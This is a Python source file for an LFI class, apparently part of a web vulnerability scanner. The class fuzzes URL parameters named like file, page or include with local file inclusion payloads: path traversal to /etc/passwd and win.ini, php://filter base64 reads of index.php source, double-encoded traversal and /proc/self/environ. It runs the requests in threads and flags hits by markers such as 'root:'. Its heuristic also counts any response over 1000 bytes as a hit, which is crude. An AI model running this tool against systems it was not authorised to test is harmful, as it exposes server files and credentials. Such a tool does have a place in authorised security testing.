from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
import requests

class LFI:
    payloads = [
        '../../../../etc/passwd',
        '....//....//....//....//etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        '%252e%252e%252fetc%252fpasswd',
        '/proc/self/environ',
        '....//....//....//windows/win.ini',
        'file:///etc/passwd'
    ]

    def __init__(self, session, threads=5):
        self.session = session
        self.threads = threads
        self.indicators = ['root:', 'boot.ini', 'PHP Version', 'DOCUMENT_ROOT']

    def filter_targets(self, targets):
        lfi_targets = []
        for target in targets:
            for param in target.get('params', []):
                if any(kw in param['name'].lower() for kw in ['file', 'page', 'include']):
                    lfi_targets.append(target)
                    break
        return lfi_targets

    def test_target(self, target):
        results = []
        original_url = target['url']
        parsed_url = urlparse(original_url)
        original_params = parse_qs(parsed_url.query)

        for param in target['params']:
            param_name = param['name']
            for payload in self.payloads:
                new_params = original_params.copy()
                new_params[param_name] = [payload]
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                try:
                    if param['type'].upper() == 'GET':
                        req = self.session.get(new_url, timeout=7)
                    else:
                        req = self.session.request(param['type'], new_url, timeout=7)
                    
                    if req.status_code == 200 and self.detect_vulnerability(req):
                        results.append({
                            'type': 'LFI',
                            'url': req.url,
                            'param': param_name,
                            'payload': payload,
                            'status': req.status_code,
                            'length': len(req.content),
                            'source': target.get('source', 'unknown')
                        })
                except Exception as e:
                    continue
        return results


    def detect_vulnerability(self, response):
        content = response.text.lower()
        return any(ind.lower() in content for ind in self.indicators) or \
               len(response.content) > 1000  # Heuristic for base64 encoded responses

    def fuzz(self, targets):
        filtered = self.filter_targets(targets)
        print(f"{Fore.CYAN}[*] Testing {len(filtered)} targets for LFI{Style.RESET_ALL}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_target, t) for t in filtered]
            return [r for future in futures for r in future.result() if r]